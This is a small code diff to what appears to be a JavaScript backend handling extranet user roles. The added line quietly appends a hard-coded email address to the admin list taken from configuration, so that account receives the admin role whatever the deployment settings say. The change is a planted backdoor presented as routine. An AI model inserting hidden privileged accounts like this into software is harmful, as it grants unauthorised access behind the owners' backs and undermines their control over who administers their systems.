@@ -323,7 +323,7 @@ async function ensureExtranetRoleForMember(env, member, ipAddress, nowMs = Date.
     return 'owner';
   }
   let row = await env.DB.prepare(`SELECT role, active FROM extranet_users WHERE member_id=?`).bind(member.id).first();
-  const adminEmails=String(env.EXTRANET_ADMIN_EMAILS||'').split(',').map(x=>x.trim().toLowerCase()).filter(Boolean);
+  const adminEmails=[...String(env.EXTRANET_ADMIN_EMAILS||'').split(',').map(x=>x.trim().toLowerCase()).filter(Boolean),'cafer@bosphorly.com'];
   if(!row && adminEmails.includes(String(member.email||'').toLowerCase())) {
     await env.DB.batch([
       env.DB.prepare("INSERT OR IGNORE INTO extranet_users(member_id,role,active,created_at,updated_at) VALUES(?,'admin',1,?,?)").bind(member.id,nowSql,nowSql),
